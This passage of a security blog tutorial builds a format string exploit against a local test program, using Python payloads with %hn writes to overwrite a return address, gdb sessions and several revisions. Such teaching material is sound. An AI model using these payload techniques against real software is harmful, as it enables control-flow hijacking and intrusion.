</span></span><span style="display:flex;"><span><span style="color:#75715e"># 0x565561cd &lt;== pwnme address</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload  <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x3c\xd1\xff\xff</span><span style="color:#e6db74">&#34;</span> <span style="color:#75715e"># return address in little endian format (low order)</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x3e\xd1\xff\xff</span><span style="color:#e6db74">&#34;</span> <span style="color:#75715e"># return address in little endian format (high order)</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> ( <span style="color:#ae81ff">0x61cd</span> <span style="color:#f92672">-</span> len(payload) ) 
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;%4$hn&#34;</span> <span style="color:#75715e"># pass the low order address as a parameter to printf</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;B&#34;</span> <span style="color:#f92672">*</span> ( <span style="color:#ae81ff">0x5655</span> <span style="color:#f92672">-</span> len(payload) ) 
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;%5$hn&#34;</span> <span style="color:#75715e"># pass the high order address as a parameter to printf</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;exploit.txt&#34;</span>, <span style="color:#e6db74">&#34;wb+&#34;</span>) <span style="color:#66d9ef">as</span> f:
</span></span><span style="display:flex;"><span>    f<span style="color:#f92672">.</span>write(payload)
</span></span></code></pre></div><p>Let&rsquo;s run this exploit and see what going on:</p>
<pre tabindex="0"><code>──(abdallah㉿pc)-[~]
└─$ gdb -nx -q ./test
Reading symbols from ./test...
(No debugging symbols found in ./test)
(gdb) b vulnerable 
Breakpoint 1 at 0x11fc
(gdb) r &lt; exploit.txt
Starting program: /home/abdallah/test &lt; exploit.txt

Breakpoint 1, 0x565561fc in vulnerable ()
(gdb) disas vulnerable 
Dump of assembler code for function vulnerable:
   0x565561f8 &lt;+0&gt;:	push   %ebp
   0x565561f9 &lt;+1&gt;:	mov    %esp,%ebp
   0x565561fb &lt;+3&gt;:	push   %ebx
=&gt; 0x565561fc &lt;+4&gt;:	sub    $0x2004,%esp
   0x56556202 &lt;+10&gt;:	call   0x565560d0 &lt;__x86.get_pc_thunk.bx&gt;
   0x56556207 &lt;+15&gt;:	add    $0x2df9,%ebx
   0x5655620d &lt;+21&gt;:	mov    -0xc(%ebx),%eax
   0x56556213 &lt;+27&gt;:	mov    (%eax),%eax
   0x56556215 &lt;+29&gt;:	sub    $0x4,%esp
   0x56556218 &lt;+32&gt;:	push   %eax
   0x56556219 &lt;+33&gt;:	push   $0x2000
   0x5655621e &lt;+38&gt;:	lea    -0x2008(%ebp),%eax
   0x56556224 &lt;+44&gt;:	push   %eax
   0x56556225 &lt;+45&gt;:	call   0x56556040 &lt;fgets@plt&gt;
   0x5655622a &lt;+50&gt;:	add    $0x10,%esp
   0x5655622d &lt;+53&gt;:	sub    $0xc,%esp
   0x56556230 &lt;+56&gt;:	lea    -0x2008(%ebp),%eax
   0x56556236 &lt;+62&gt;:	push   %eax
   0x56556237 &lt;+63&gt;:	call   0x56556030 &lt;printf@plt&gt;
   0x5655623c &lt;+68&gt;:	add    $0x10,%esp
   0x5655623f &lt;+71&gt;:	nop
   0x56556240 &lt;+72&gt;:	mov    -0x4(%ebp),%ebx
   0x56556243 &lt;+75&gt;:	leave  
   0x56556244 &lt;+76&gt;:	ret    
End of assembler dump.
(gdb) x/a 0xffffd13c
0xffffd13c:	0x56556264 &lt;main+31&gt;
</code></pre><p>We put a breakpoint on the <code>vulnerable</code> function, then run the program and pass the payload, when we examine the return address we see that it returns to the main function. It is assumed that when the <code>printf</code> function is called, the address of the <code>pwnme</code> function is written over this data. Let&rsquo;s put a breakpoint on ret instruction and re-investigate if the expected data has been written or not:</p>
<pre tabindex="0"><code>(gdb) b *0x56556244
Breakpoint 2 at 0x56556244
(gdb) c
Continuing.
&lt;���&gt;���AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Breakpoint 2, 0x56556244 in vulnerable ()
(gdb) x/a 0xffffd13c
0xffffd13c:	0x56556264 &lt;main+31&gt;
(gdb) c
Continuing.
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[Inferior 1 (process 7959) exited normally]
(gdb) 
</code></pre><p>We failed. No crash and the return address was never touched, why !?!? Does that make sense !?!?
The answer is very simple: the program accepts only 8192 bytes as an input but our payload is very large. We are now in dire need of reducing the injected payload without losing its effectiveness but how that can be done? When I introduced the <code>%n</code> feature I told you &ldquo;that specifier requires an int pointer and writes in that variable how many characters have been processed by the function&rdquo;, then now we have to trick the <code>printf</code> function to process large data without actually passing this data through stdin. The <code>printf</code> function has a nice feature that allows developers to pad their data with spaces without actually writing it by just specifying the number of required spaces before the specifier as follows <code>%10s</code>. We can abuse this feature in order to reduce our payload size and get the same result without exceeding the limit. Let&rsquo;s modify our exploit:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span><span style="color:#75715e"># Author     ==&gt; Abdallah Mohamed (0xNinjaCyclone)</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 0xffffd13c &lt;== target (return address pointer)</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 0x565561cd &lt;== pwnme address</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload  <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x3c\xd1\xff\xff</span><span style="color:#e6db74">&#34;</span> <span style="color:#75715e"># return address in little endian format (low order)</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x3e\xd1\xff\xff</span><span style="color:#e6db74">&#34;</span> <span style="color:#75715e"># return address in little endian format (high order)</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;%&#34;</span> <span style="color:#f92672">+</span> str( (<span style="color:#ae81ff">0x61cd</span> <span style="color:#f92672">-</span> len(payload)) )<span style="color:#f92672">.</span>encode() <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;p&#34;</span> <span style="color:#75715e"># =&gt; %25029p</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;%4$hn&#34;</span> <span style="color:#75715e"># pass the low order address as a parameter to printf</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;%&#34;</span> <span style="color:#f92672">+</span> str( (<span style="color:#ae81ff">0x5655</span> <span style="color:#f92672">-</span> len(payload)) )<span style="color:#f92672">.</span>encode() <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;p&#34;</span> 
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;%5$hn&#34;</span> <span style="color:#75715e"># pass the high order address as a parameter to printf</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;exploit.txt&#34;</span>, <span style="color:#e6db74">&#34;wb+&#34;</span>) <span style="color:#66d9ef">as</span> f:
</span></span><span style="display:flex;"><span>    f<span style="color:#f92672">.</span>write(payload)
</span></span></code></pre></div><p>Let&rsquo;s run under gdb and see if this strategy will work or not.</p>
<center><img src="/imgs/failed_overwriting.png" width="400"/></center>
<p>We could successfully overwrite the low order bytes with the expected value, but the high order bytes seem to be not right. The reason is that the second write writes the number of all the characters that were previously processed and were written in the low-order address. Moreover, the high-order value of the address is smaller than its counterpart. There are two solutions to this problem: either rearrange the writing priorities and write the high-order value first and then the low-order value. As for making the function process more letters until the 2 bytes become insufficient, this will make it overflow and the 2 bytes will become zero again, and from here we start counting from the beginning. This method is not difficult, as it can be done mathematically easily, but I think the first method is easier and more effective. Let us modify the exploitation code and re-arrange writing priorities.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span><span style="color:#75715e"># Author     ==&gt; Abdallah Mohamed (0xNinjaCyclone)</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 0xffffd13c &lt;== target (return address pointer)</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 0x565561cd &lt;== pwnme address</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload  <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x3c\xd1\xff\xff</span><span style="color:#e6db74">&#34;</span> <span style="color:#75715e"># return address in little endian format (low order)</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x3e\xd1\xff\xff</span><span style="color:#e6db74">&#34;</span> <span style="color:#75715e"># return address in little endian format (high order)</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;%&#34;</span> <span style="color:#f92672">+</span> str( (<span style="color:#ae81ff">0x5655</span> <span style="color:#f92672">-</span> len(payload)) )<span style="color:#f92672">.</span>encode() <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;p&#34;</span> 
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;%5$hn&#34;</span> <span style="color:#75715e"># pass the high order address as a parameter to printf</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;%&#34;</span> <span style="color:#f92672">+</span> str( (<span style="color:#ae81ff">0x61cd</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x5655</span> <span style="color:#f92672">-</span> len(payload)) )<span style="color:#f92672">.</span>encode() <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;p&#34;</span> 
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;%4$hn&#34;</span> <span style="color:#75715e"># pass the low order address as a parameter to printf</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;exploit.txt&#34;</span>, <span style="color:#e6db74">&#34;wb+&#34;</span>) <span style="color:#66d9ef">as</span> f:
</span></span><span style="display:flex;"><span>    f<span style="color:#f92672">.</span>write(payload)
</span></span></code></pre></div><center><img src="/imgs/failed_overwriting2.png" width="550"/></center>
<p>Our plan worked and we were close to writing the value we wanted, we need to add 0x14 only to the current value.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span><span style="color:#75715e"># Author     ==&gt; Abdallah Mohamed (0xNinjaCyclone)</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 0xffffd13c &lt;== target (return address pointer)</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 0x565561cd &lt;== pwnme address</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload  <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x3c\xd1\xff\xff</span><span style="color:#e6db74">&#34;</span> <span style="color:#75715e"># return address in little endian format (low order)</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x3e\xd1\xff\xff</span><span style="color:#e6db74">&#34;</span> <span style="color:#75715e"># return address in little endian format (high order)</span>
